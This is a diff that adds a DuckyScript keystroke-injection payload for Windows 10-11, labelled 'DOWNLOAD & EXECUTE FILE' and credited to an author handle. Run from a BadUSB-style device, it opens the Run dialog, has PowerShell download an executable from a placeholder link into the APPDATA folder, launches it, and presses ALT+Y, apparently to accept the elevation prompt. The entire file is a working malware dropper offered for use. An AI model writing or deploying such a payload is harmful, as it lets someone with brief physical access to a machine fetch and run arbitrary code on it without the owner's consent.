@@ -1,0 +1,15 @@
+REM ############################################
+REM # Title    : DOWNLOAD & EXECUTE FILE       |
+REM # Author   : RXSEESH                       |
+REM # Version  : FIXED                         |
+REM # Category : EXECUTION                     |
+REM # Target   : WINDOWS 10-11                 |
+REM ############################################
+REM   @guns.lol/RXSEESH | @github.com/RXSEESH
+GUI r
+DELAY 750
+STRING powershell -command "iwr -Uri 'YOUR_LINK' -OutFile \"$env:APPDATA\file.exe\"; Start-Process \"$env:APPDATA\file.exe\""
+DELAY 750
+ENTER
+DELAY 5000
+ALT y
